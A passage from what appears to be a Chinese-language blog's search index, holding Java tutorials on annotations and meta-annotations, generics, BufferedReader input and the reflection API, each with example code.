failed++;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.printf(&quot;测试结果： 通过: %d, 失败： %d%n&quot;, passed, failed);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用第三方开发的Annotation类型"><a href="#使用第三方开发的Annotation类型" class="headerlink" title="使用第三方开发的Annotation类型"></a>使用第三方开发的Annotation类型</h2><p>这也是开发人员所常常用到的一种方式。比如我们在使用Hibernate3.0时就可以利用Annotation生成数据表映射配置文件，而不必使用Xdoclet。\</p>
<h2 id="Meta-Annotation"><a href="#Meta-Annotation" class="headerlink" title="Meta-Annotation"></a>Meta-Annotation</h2><p>Annotation<br>类型可以被它们自己所标注。Java5.0定义了4个标准的meta-annotation类型，它们被用来提供对其它annotation类型作说明。这些类型和它们所支持的类在java.lang.annotation包中可以找到。如果需要更详细的信息可以参考jdk5.0手册。</p>
<h2 id="1．再谈Target"><a href="#1．再谈Target" class="headerlink" title="1．再谈Target"></a>1．再谈Target</h2><p>作为meta-annotation类型的Target,它描述了annotation所修饰的程序成员的类型。当一个annotation类型没有<br>Target时，它将被作为普通的annotation看待。当将它修饰一个特定的程序成员时，它将发挥其应用的作用，例如：Override用于修饰方法时，增加了@Target这个meta-annotation就使编译器对annotation作检查，从而去掉修饰错误类型的Override。</p>
<p>Target<br>meta-annotation类型有唯一的value作为成员。这个成员的类型是java.lang.annotation.ElementType[]类型的，ElementType类型是可以被标注的程序成员的枚举类型。</p>
<h2 id="2．Retention的用法"><a href="#2．Retention的用法" class="headerlink" title="2．Retention的用法"></a>2．Retention的用法</h2><p>我们在文章的开头曾经提到过Retention，但是没有详细讲解。Retention描述了annotation是否被编译器丢弃或者保留在class文件；如果保留在class文件中，是否在class文件被装载时被虚拟机读取。默认情况下，annotation被保存在class文件中，但在运行时并不能被反射访问。Retention具有三个取值：source、class、runtime，这些取值来自<br>java.lang.annotation.RetentionPolicy的枚举类型值。</p>
<p>Retention<br>meta-annotation类型有唯一的value作为成员，它的取值来自java.lang.annotation.RetentionPolicy的枚举类型值。</p>
<h2 id="3．Documented"><a href="#3．Documented" class="headerlink" title="3．Documented"></a>3．Documented</h2><p>Documented是一个meta-annotation类型，用于描述其它类型的annotation应该被作为被标注的程序成员的公共API，因此可以被例如javadoc此类的工具文档化。</p>
<p>Documented是一个marker annotation，没有成员。</p>
<h2 id="4．Inherited"><a href="#4．Inherited" class="headerlink" title="4．Inherited"></a>4．Inherited</h2><p>@Inherited meta-annotation也是一个marker<br>annotation，它阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited修饰的annotation类型被用于一个class，则这个annotation将被用于该class的子类。</p>
<p>注意：@Inherited<br>annotation类型是被标注过的class的子类所继承。类并不从它所实现的接口继承annotation，方法并不从它所重载的方法继承annotation。</p>
<p>值得思考的是，当@Inherited<br>annotation类型标注的annotation的Retention是RetentionPolicy.RUNTIME，则反射API增强了这种继承性。如果我们使用java.lang.reflect去查询一个@Inherited<br>annotation类型的annotation时，反射代码检查将展开工作：检查class和其父类，直到发现指定的annotation类型被发现，或者到达类继承结构的顶层。\</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】Generic泛型使用指南</title>
    <url>/blog/plang/java/features/generic/</url>
    <content><![CDATA[<h2 id="泛型简介"><a href="#泛型简介" class="headerlink" title="泛型简介"></a>泛型简介</h2><p>在Java SE 1.5之前，没有泛型的情况的下，通过对类型Object的引用来实现参数的&quot;任意化&quot;，&quot;任意化&quot;带来的缺点是要做显式的强制类型转换，而这种转换是要求开发者对实际参数类型可以预知的情况下进行的。对于强制类型转换错误的情况，编译器可能不提示错误，在运行的时候才出现异常，这是一个安全隐患。</p>
<p>泛型的好处是在编译的时候检查类型安全，并且所有的强制转换都是自动和隐式的，提高代码的重用率。</p>
<h2 id="规则和限制"><a href="#规则和限制" class="headerlink" title="规则和限制"></a>规则和限制</h2><p>　1、泛型的类型参数只能是类类型（包括自定义类），不能是简单类型。</p>
<p>　2、同一种泛型可以对应多个版本（因为参数类型是不确定的），不同版本的泛型类实例是不兼容的。</p>
<p>　3、泛型的类型参数可以有多个。</p>
<p>　4、泛型的参数类型可以使用extends语句，例如&lt;T extends superclass&gt;。习惯上称为”有界类型”。</p>
<p>　5、泛型的参数类型还可以是通配符类型。例如Class&lt;?&gt; classType &#x3D;Class.forName(&quot;java.lang.String&quot;);</p>
<p>泛型还有接口、方法等等，内容很多，需要花费一番功夫才能理解掌握并熟练应用。</p>
<h2 id="泛型-类"><a href="#泛型-类" class="headerlink" title="泛型 类"></a>泛型 类</h2><p>在类的命名空间中使用的泛型，在类名后加&quot;&lt;逗号分割的名字列表&gt;&quot;。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GenericFoo&lt;T&gt; &#123;</span><br><span class="line">    private T foo;</span><br><span class="line">    public void setFoo(T foo) &#123;</span><br><span class="line">        this.foo = foo;</span><br><span class="line">    &#125;</span><br><span class="line">    public T getFoo() &#123;</span><br><span class="line">        return foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt;T&gt; 用来宣告一个型态持有者（Holder）T，之后您可以用 T作为型态代表来宣告变量（参考）名称。</p>
<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GenericFoo&lt;Boolean&gt; foo1 = new GenericFoo&lt;Boolean&gt;();</span><br><span class="line">GenericFoo&lt;Integer&gt; foo2 = new GenericFoo&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">foo1.setFoo(new Boolean(true));</span><br><span class="line">Boolean b = foo1.getFoo();</span><br><span class="line"></span><br><span class="line">foo2.setFoo(new Integer(10));</span><br><span class="line">Integer i = foo2.getFoo();</span><br></pre></td></tr></table></figure>

<h2 id="泛型类实例"><a href="#泛型类实例" class="headerlink" title="泛型类实例"></a>泛型类实例</h2><p>可以在定义泛型类别时，宣告多个类型持有者，例如：</p>
<h5 id="GenericFoo-java"><a href="#GenericFoo-java" class="headerlink" title="GenericFoo.java"></a>GenericFoo.java</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GenericFoo&lt;T1, T2&gt; &#123;</span><br><span class="line">    private T1 foo1;</span><br><span class="line">    private T2 foo2;</span><br><span class="line">    public void setFoo1(T1 foo1) &#123;</span><br><span class="line">        this.foo1 = foo1;</span><br><span class="line">    &#125;</span><br><span class="line">    public T1 getFoo1() &#123;</span><br><span class="line">        return foo1;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setFoo2(T2 foo2) &#123;</span><br><span class="line">        this.foo2 = foo2;</span><br><span class="line">    &#125;</span><br><span class="line">    public T2 getFoo2() &#123;</span><br><span class="line">        return foo2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>您可以如下使用GenericFoo类别，分别以Integer与Boolean取代T1与T2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GenericFoo&lt;Integer, Boolean&gt; foo =new GenericFoo&lt;Integer, Boolean&gt;();</span><br></pre></td></tr></table></figure>

<p>如果是数组的话，可以像这样：</p>
<h5 id="GenericFoo-java-1"><a href="#GenericFoo-java-1" class="headerlink" title="GenericFoo.java"></a>GenericFoo.java</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GenericFoo&lt;T&gt; &#123;</span><br><span class="line">    private T[] fooArray;</span><br><span class="line">    public void setFooArray(T[] fooArray) &#123;</span><br><span class="line">        this.fooArray = fooArray;</span><br><span class="line">    &#125;</span><br><span class="line">    public T[] getFooArray() &#123;</span><br><span class="line">        return fooArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>您可以像下面的方式来使用它：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] strs = &#123;&quot;caterpillar&quot;, &quot;momor&quot;, &quot;bush&quot;&#125;;</span><br><span class="line"></span><br><span class="line">GenericFoo&lt;String&gt; foo = new GenericFoo&lt;String&gt;();</span><br><span class="line">foo.setFooArray(strs);</span><br><span class="line">strs = foo.getFooArray();</span><br></pre></td></tr></table></figure>

<h2 id="泛型类中的泛型类"><a href="#泛型类中的泛型类" class="headerlink" title="泛型类中的泛型类"></a>泛型类中的泛型类</h2><p>如果您已经定义了一个泛型类别，想要用这个类别来于另一个泛型类别中宣告成员的话要如何作？举个实例，假设您已经定义了下面的类别：</p>
<h5 id="GenericFoo-java-2"><a href="#GenericFoo-java-2" class="headerlink" title="GenericFoo.java"></a>GenericFoo.java</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GenericFoo&lt;T&gt; &#123;</span><br><span class="line">    private T foo;</span><br><span class="line">    public void setFoo(T foo) &#123;</span><br><span class="line">        this.foo = foo;</span><br><span class="line">    &#125;</span><br><span class="line">    public T getFoo() &#123;</span><br><span class="line">        return foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>您想要写一个包装类别（Wrapper），这个类别必须也具有GenericFoo的泛型功能，您可以这么写：</p>
<h5 id="WrapperFoo-java"><a href="#WrapperFoo-java" class="headerlink" title="WrapperFoo.java"></a>WrapperFoo.java</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class WrapperFoo&lt;T&gt; &#123;</span><br><span class="line">    private GenericFoo&lt;T&gt; foo;</span><br><span class="line">    public void setFoo(GenericFoo&lt;T&gt; foo) &#123;</span><br><span class="line">        this.foo = foo;</span><br><span class="line">    &#125;</span><br><span class="line">    public GenericFoo&lt;T&gt; getFoo() &#123;</span><br><span class="line">        return foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这么一来，您就可以保留型态持有者 T 的功能，一个使用的例子如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GenericFoo&lt;Integer&gt; foo = new GenericFoo&lt;Integer&gt;();</span><br><span class="line">foo.setFoo(new Integer(10));</span><br><span class="line"></span><br><span class="line">WrapperFoo&lt;Integer&gt; wrapper = new WrapperFoo&lt;Integer&gt;();</span><br><span class="line">wrapper.setFoo(foo);</span><br></pre></td></tr></table></figure>

<h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p>是否拥有泛型方法，与其所在的类是否泛型没有关系。要定义泛型方法，只需将泛型参数列表置于返回值前。</p>
<p>使用泛型方法时，不必指明参数类型，编译器会自己找出具体的类型。泛型方法除了定义不同，调用就像普通方法一样。</p>
<p>需要注意，一个static方法，无法访问泛型类的类型参数，所以，若要static方法需要使用泛型能力，必须使其成为泛型方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ExampleA &#123;</span><br><span class="line">    public  void f(T x) &#123;</span><br><span class="line">        System.out.println(x.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExampleA ea = new ExampleA();</span><br><span class="line">        ea.f(&quot; &quot;);</span><br><span class="line">        ea.f(10);</span><br><span class="line">        ea.f(&#x27;a&#x27;);</span><br><span class="line">        ea.f(ea);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.String 　　</span><br><span class="line">java.lang.Integer 　　</span><br><span class="line">java.lang.Character </span><br></pre></td></tr></table></figure>

<h2 id="通配符泛型"><a href="#通配符泛型" class="headerlink" title="通配符泛型"></a>通配符泛型</h2><p>为了解决类型被限制死了不能动态根据实例来确定的缺点，引入了&quot;通配符泛型&quot;，针对上面的例子，使用通配泛型格式为&lt;? extends Collection&gt;，&quot;?&quot;代表未知类型，这个类型是实现Collection接口。那么上面实现的方式可以写为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CollectionGenFooDemo &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">    CollectionGenFoo&lt;ArrayList&gt; listFoo = null;</span><br><span class="line">    listFoo = new CollectionGenFoo&lt;ArrayList&gt;(new ArrayList());</span><br><span class="line">    //现在不会出错了</span><br><span class="line">    CollectionGenFoo&lt;? extends Collection&gt; listFoo1 = null;</span><br><span class="line">    listFoo=new CollectionGenFoo&lt;ArrayList&gt;(new ArrayList());</span><br><span class="line">    System.out.println(&quot;实例化成功!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>1、如果只指定了&lt;?&gt;，而没有extends，则默认是允许Object及其下的任何Java类了。也就是任意类。</p>
<p>2、通配符泛型不单可以向下限制，如&lt;? extends Collection&gt;，还可以向上限制，如&lt;? super Double&gt;，表示类型只能接受Double及其上层父类类型，如Number、Object类型的实例。</p>
<p>3、泛型类定义可以有多个泛型参数，中间用逗号隔开，还可以定义泛型接口，泛型方法。这些都泛型类中泛型的使用规则类似。</p>
<h2 id="限制泛型可用类型"><a href="#限制泛型可用类型" class="headerlink" title="限制泛型可用类型"></a>限制泛型可用类型</h2><p>在定义泛型类别时，预设您可以使用任何的型态来实例化泛型类别中的型态持有者，但假设您想要限制使用泛型类别时，只能用某个特定型态或其子类别才能实例化型态持有者的话呢？</p>
<p>您可以在定义型态持有者时，一并使用&quot;extends&quot;指定这个型态持有者必须是扩充某个类型，举个实例来说：</p>
<h5 id="ListGenericFoo-java"><a href="#ListGenericFoo-java" class="headerlink" title="ListGenericFoo.java"></a>ListGenericFoo.java</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">public class ListGenericFoo&lt;T extends List&gt; &#123;</span><br><span class="line">    private T[] fooArray;</span><br><span class="line">    public void setFooArray(T[] fooArray) &#123;</span><br><span class="line">        this.fooArray = fooArray;</span><br><span class="line">    &#125;</span><br><span class="line">    public T[] getFooArray() &#123;</span><br><span class="line">        return fooArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ListGenericFoo在宣告类型持有者时，一并指定这个持有者必须扩充自List接口（interface），在限定持有者时，无论是要限定的对象是接口或类别，都是使用&quot;extends&quot;关键词。</p>
<p>您使用&quot;extends&quot;限定型态持有者必须是实作List的类别或其子类别，例如LinkedList与ArrayList，下面的程序是合法的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListGenericFoo&lt;LinkedList&gt; foo1 =new ListGenericFoo&lt;LinkedList&gt;();</span><br><span class="line">ListGenericFoo&lt;ArrayList&gt; foo2 =new ListGenericFoo&lt;ArrayList&gt;();</span><br></pre></td></tr></table></figure>

<p>但是如果不是List的类别或是其子类别，就会发生编译错误，例如下面的程序通不过编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListGenericFoo&lt;HashMap&gt; foo3 =new ListGenericFoo&lt;HashMap&gt;();</span><br></pre></td></tr></table></figure>

<p>编译器会回报以下错误讯息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type parameter java.util.HashMap is not within its bound</span><br><span class="line">ListGenericFoo&lt;HashMap&gt; foo3 = new ListGenericFoo&lt;HashMap&gt;();</span><br></pre></td></tr></table></figure>

<p>HashMap并没有实作List界面，所以无法用来实例化型态持有者，事实上，当您没有使用extends关键词限定型态持有者时，预设则是Object下的所有子类别都可以实例化型态持有者，即只写&lt;T&gt;时就相当于&lt;T extends Object&gt;。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO 之BufferedReader</title>
    <url>/blog/plang/java/io/bufferedreader/</url>
    <content><![CDATA[<p>BufferedReader只能接受字符流的缓冲区，因为每一个中文需要占据两个字节，所以需要将System.in这个字节输入流变为字符输入流</p>
<pre><code>import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
 
/**
 * 使用缓冲区从键盘上读入内容
 * */
public class BufferedReaderDemo&#123;
    public static void main(String[] args)&#123;
        BufferedReader buf = new BufferedReader(
                new InputStreamReader(System.in));
        String str = null;
        System.out.println(&quot;请输入内容&quot;);
        try&#123;
            str = buf.readLine();
        &#125;catch(IOException e)&#123;
            e.printStackTrace();
        &#125;
        System.out.println(&quot;你输入的内容是：&quot; + str);
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】反射机制使用指南</title>
    <url>/blog/plang/java/features/reflect/</url>
    <content><![CDATA[<h2 id="JAVA反射机制定义"><a href="#JAVA反射机制定义" class="headerlink" title="JAVA反射机制定义"></a>JAVA反射机制定义</h2><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。　</p>
<ol>
<li>Reflection 是 Java 程序开发语言的特征之一</li>
<li>允许运行中的 Java 程序对自身进行 &quot;自审&quot;</li>
<li>反射API用于反应在当前Java虚拟机中的类、接口或者对象信息\</li>
</ol>
<p>Java反射机制主要提供了以下功能：</p>
<ol>
<li>获取一个对象的类信息.</li>
<li>获取一个类的访问修饰符、成员、方法、构造方法以及超类的信息.</li>
<li>检获属于一个接口的常量和方法声明.</li>
<li>创建一个直到程序运行期间才知道名字的类的实例.</li>
<li>获取并设置一个对象的成员，甚至这个成员的名字是在程序运行期间才知道.</li>
<li>检测一个在运行期间才知道名字的对象的方法\</li>
</ol>
<p>使用 Reflection遵循三个步骤：</p>
<ol>
<li>第一步是获得你想操作的类的 java.lang.Class 对象</li>
<li>第二步是调用诸如 getDeclaredMethods 的方法</li>
<li>第三步使用 reflection API 来操作这些信息\</li>
</ol>
<h2 id="一个反射简单的例子"><a href="#一个反射简单的例子" class="headerlink" title="一个反射简单的例子"></a>一个反射简单的例子</h2><pre><code>import java.lang.reflect.*;
public class DumpMethods &#123;
    public static void main(String args[]) &#123;
        try &#123;
            Class c = Class.forName(args[0]);
            Method m[] = c.getDeclaredMethods();
            for (int i = 0; i &lt; m.length; i++)
                System.out.println(m[i].toString());
        &#125; catch (Throwable e) &#123;
            System.err.println(e);
        &#125;
    &#125;
&#125;
</code></pre>
<p>执行如下语句：</p>
<pre><code>java DumpMethods java.util.Stack
</code></pre>
<h2 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h2><p>众所周知Java有个Object class，是所有Java classes的继承根源，其内声明了数个应该在所有Java class中被改写的methods：hashCode()、equals()、clone()、toString()、getClass()等。其中getClass()返回一个Class object。</p>
<p>Class<br>class十分特殊。它和一般classes一样继承自Object，其实体用以表达Java程序运行时的classes和interfaces，也用来表达enum、array、primitive Java types（boolean, byte, char, short, int, long, float,double）以及关键词void。当一个class被加载，或当加载器（class loader）的defineClass()被JVM调用，JVM 便自动产生一个Class object。</p>
<h2 id="获得一个-Class-对象"><a href="#获得一个-Class-对象" class="headerlink" title="获得一个 Class 对象"></a>获得一个 Class 对象</h2><p>如果一个类的实例已经得到，你可以使用</p>
<pre><code> Class c = 对象名.getClass(); 
</code></pre>
<p>例：</p>
<pre><code>TextField t = new TextField(); 
Class c = t.getClass();
Class s = c.getSuperclass(); 
</code></pre>
<p>如果你在编译期知道类的名字，你可以使用如下的方法</p>
<pre><code>Class c = java.awt.Button.class; 
</code></pre>
<p>或者</p>
<pre><code> Class c = Integer.TYPE;
</code></pre>
<p>如果类名在编译期不知道, 但是在运行期可以获得, 你可以使用下面的方法</p>
<pre><code> Class c = Class.forName(strg); 
</code></pre>
<p>例如：</p>
<pre><code>Class c1 = Class.forName (&quot;java.lang.String&quot;);
Class c2 = Class.forName (&quot;java.awt.Button&quot;);
Class c3 = Class.forName (&quot;java.util.LinkedList$Entry&quot;); 
</code></pre>
<h2 id="获取类的方法信息"><a href="#获取类的方法信息" class="headerlink" title="获取类的方法信息"></a>获取类的方法信息</h2><ol>
<li>获取方法名</li>
<li>获取方法参数信息</li>
</ol>
<!-- -->

<pre><code>import java.lang.reflect.*;
public class method1 &#123;
    private int f1(Object p, int x) throws NullPointerException &#123;
        if (p == null)
        throw new NullPointerException();
        return x;
    &#125;
    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;method1&quot;);
            Method methlist[] = cls.getDeclaredMethods();
            for (int i = 0; i &lt; methlist.length; i++) &#123;
                Method m = methlist[i];
                System.out.println(&quot;name = &quot; + m.getName());
                System.out.println(&quot;decl class = &quot; + m.getDeclaringClass());
                Class pvec[] = m.getParameterTypes();
                for (int j = 0; j &lt; pvec.length; j++)
                        System.out.println(&quot;param #&quot; + j + &quot; &quot; + pvec[j]);
                Class evec[] = m.getExceptionTypes();
                for (int j = 0; j &lt; evec.length; j++)
                        System.out.println(&quot;ExceptionType #&quot; + j + &quot; &quot; + evec[j]);
                System.out.println(&quot;return type = &quot; + m.getReturnType());
                System.out.println(&quot;-----&quot;);
            &#125;
        &#125; catch (Throwable e) &#123;
            System.err.println(e);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="获取构造方法信息"><a href="#获取构造方法信息" class="headerlink" title="获取构造方法信息"></a>获取构造方法信息</h2><p> </p>
<pre><code>import java.lang.reflect.*;
public class constructor1 &#123;
    public constructor1() &#123; &#125;
    protected constructor1(int i, double d) &#123;  &#125;
    public static void main(String args[])  &#123;
        try &#123;
            Class cls = Class.forName(&quot;constructor1&quot;);
            Constructor ctorlist[] = cls.getDeclaredConstructors();
            for (int i = 0; i &lt; ctorlist.length; i++) &#123;
                Constructor ct = ctorlist[i];
                System.out.println(&quot;name = &quot; + ct.getName());
                System.out.println(&quot;decl class = &quot; + ct.getDeclaringClass());
                Class pvec[] = ct.getParameterTypes();
                for (int j = 0; j &lt; pvec.length; j++)
                        System.out.println(&quot;ParameterType #&quot; + j + &quot; &quot; + pvec[j]);
                Class evec[] = ct.getExceptionTypes();
                for (int j = 0; j &lt; evec.length; j++)
                        System.out.println(&quot;ExceptionType #&quot; + j + &quot; &quot; + evec[j]);
                System.out.println(&quot;-----&quot;);
            &#125;
        &#125; catch (Throwable e) &#123;
            System.err.println(e);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="获取类的属性信息"><a href="#获取类的属性信息" class="headerlink" title="获取类的属性信息"></a>获取类的属性信息</h2><p> </p>
<pre><code>import java.lang.reflect.*;
public class field1 &#123;
    private double d;
    public static final int i = 37;
    String s = &quot;testing&quot;;
    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;field1&quot;);
            Field fieldlist[] = cls.getDeclaredFields();
            for (int i = 0; i &lt; fieldlist.length; i++) &#123;
                Field fld = fieldlist[i];
                System.out.println(&quot;name = &quot; + fld.getName());
                System.out.println(&quot;decl class = &quot; + fld.getDeclaringClass());
                System.out.println(&quot;type = &quot; + fld.getType());
                int mod = fld.getModifiers();
                System.out.println(&quot;modifiers = &quot; + Modifier.toString(mod));
                System.out.println(&quot;-----&quot;);            &#125;
        &#125; catch (Throwable e) &#123;System.err.println(e);&#125;
    &#125;
&#125;
</code></pre>
<p> </p>
<h2 id="用反射根据方法的名称来执行方法"><a href="#用反射根据方法的名称来执行方法" class="headerlink" title="用反射根据方法的名称来执行方法"></a>用反射根据方法的名称来执行方法</h2><p>获取指定方法要指定两部分内容：</p>
<ol>
<li>方法名</li>
<li>方法所需参数</li>
</ol>
<p>因为java中有重载一说，同名方法只要参数相异是可以共存的，所以确定一个方法时方法参数也是必不可少的。</p>
<p>执行方法要有一个对象实体，一般我们都是执行某个对象的某个方法，所以一般格式如下：</p>
<pre><code>方法名.invoke(对象实体,参数列表)
</code></pre>
<p> </p>
<pre><code>import java.lang.reflect.*;
public class method2 &#123;
    public int add(int a, int b) &#123;return a + b;&#125;
    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;method2&quot;);
            Class partypes[] = new Class[2];
            partypes[0] = Integer.TYPE;
            partypes[1] = Integer.TYPE;
            Method meth = cls.getMethod(&quot;add&quot;, partypes);
            method2 methobj = new method2();
            Object arglist[] = new Object[2];
            arglist[0] = new Integer(37);
            arglist[1] = new Integer(47);
            Object retobj = meth.invoke(methobj, arglist);
            Integer retval = (Integer) retobj;
            System.out.println(retval.intValue());
        &#125; catch (Throwable e) &#123;System.err.println(e);&#125;
    &#125;
&#125;
</code></pre>
<p> </p>
<h2 id="用反射创建新的对象"><a href="#用反射创建新的对象" class="headerlink" title="用反射创建新的对象"></a>用反射创建新的对象</h2><p>如果创建对象不要参数，可以用Class对象的newInstance()来实现。</p>
<p>如果要参数的话，就要根据参数类型找到构造函数，再用构造函数来创建了。</p>
<pre><code>import java.lang.reflect.*;
public class constructor2 &#123;
    public constructor2() &#123;&#125;
    public constructor2(int a, int b) &#123;
        System.out.println(&quot;a = &quot; + a + &quot; b = &quot; + b);
    &#125;
    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;constructor2&quot;);
            Class partypes[] = new Class[2];
            partypes[0] = Integer.TYPE;
            partypes[1] = Integer.TYPE;
            Constructor ct = cls.getConstructor(partypes);
            Object arglist[] = new Object[2];
            arglist[0] = new Integer(37);
            arglist[1] = new Integer(47);
            Object retobj = ct.newInstance(arglist);
        &#125; catch (Throwable e) &#123;System.err.println(e);&#125;
    &#125;
&#125;
</code></pre>
<h2 id="用反射改变属性的值"><a href="#用反射改变属性的值" class="headerlink" title="用反射改变属性的值"></a>用反射改变属性的值</h2><pre><code>import java.lang.reflect.*;

public class field2 &#123;
    public double d;

    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;field2&quot;);
            Field fld = cls.getField(&quot;d&quot;);
            //fld.isAccessible();//非public属性要加
            field2 f2obj = new field2();
            System.out.println(&quot;d = &quot; + f2obj.d);
            fld.setDouble(f2obj, 12.34);
            System.out.println(&quot;d = &quot; + f2obj.d);
        &#125; catch (Throwable e) &#123;
            System.err.println(e);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="用反射使用数组"><a href="#用反射使用数组" class="headerlink" title="用反射使用数组"></a>用反射使用数组</h2><pre><code>import java.lang.reflect.*;

public class Array1 &#123;
    public static void main(String args[]) &#123;
        try &#123;
            Class cls = Class.forName(&quot;java.lang.String&quot;);
            Object arr = Array.newInstance(cls, 10);
            Array.set(arr, 5, &quot;this is a test&quot;);
            String s = (String) Array.get(arr, 5);
            System.out.println(s);
        &#125; catch (Throwable e) &#123;
            System.err.println(e);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="注释的反射的一个简单例子"><a href="#注释的反射的一个简单例子" class="headerlink" title="注释的反射的一个简单例子"></a>注释的反射的一个简单例子</h2><h2 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h2><pre><code>public class Bean &#123;
    public String getField() &#123;
        return field;
    &#125;

    public void setField(String field) &#123;
        this.field = field;
    &#125;
    
    @Column(&quot;column1&quot;)
    private String field;
&#125;
</code></pre>
<h2 id="Column"><a href="#Column" class="headerlink" title="Column"></a>Column</h2><pre><code>import java.lang.annotation.*;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.FIELD)
public @interface Column &#123;
    String value() default &quot;&quot;;
&#125;
</code></pre>
<h2 id="获取属性名和注释值"><a href="#获取属性名和注释值" class="headerlink" title="获取属性名和注释值"></a>获取属性名和注释值</h2><pre><code>import java.lang.reflect.Field;

public class Main &#123;
    public static void main(String[] args) &#123;
        // TODO Auto-generated method stub
        Class&lt;Bean &gt; c=Bean.class;
        Field[] fs=c.getDeclaredFields();
        for(Field f:fs)&#123;
            System.out.println(f.getName());
            System.out.println(f.isAccessible());
            Column ca=f.getAnnotation(Column.class);
            System.out.println(ca.value());
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="对属性赋值"><a href="#对属性赋值" class="headerlink" title="对属性赋值"></a>对属性赋值</h2><pre><code>import java.lang.reflect.Field;

public class Main &#123;
    public static void main(String[] args) &#123;
        // TODO Auto-generated method stub
        Class&lt;Bean&gt; c=Bean.class;
        Field[] fs=c.getDeclaredFields();
        Bean b = null;
        try &#123;
            b=c.newInstance();
        &#125; catch (InstantiationException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125; catch (IllegalAccessException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125;
        Field f=fs[0];//由于只有一个属性所以这样测试
        System.out.println(f.getName()+&quot;=&quot;+b.getField());
        f.setAccessible(true);//使私有属性可以被设置
        try &#123;
            if(f.getType()==String.class)
                f.set(b, &quot;iteedu&quot;);//将b对象的f属性设置为&quot;iteedu&quot;
        &#125; catch (IllegalArgumentException e) &#123;
            // TODO Auto-generated catch blockd
            e.printStackTrace();
        &#125; catch (IllegalAccessException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125;
        System.out.println(f.getName()+&quot;=&quot;+b.getField());
        
    &#125;
&#125;
</code></pre>
<h2 id="根据属性调用set方法"><a href="#根据属性调用set方法" class="headerlink" title="根据属性调用set方法"></a>根据属性调用set方法</h2><pre><code>import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Main &#123;
    public static void main(String[] args) &#123;
        // TODO Auto-generated method stub
        Class&lt;Bean&gt; c = Bean.class;
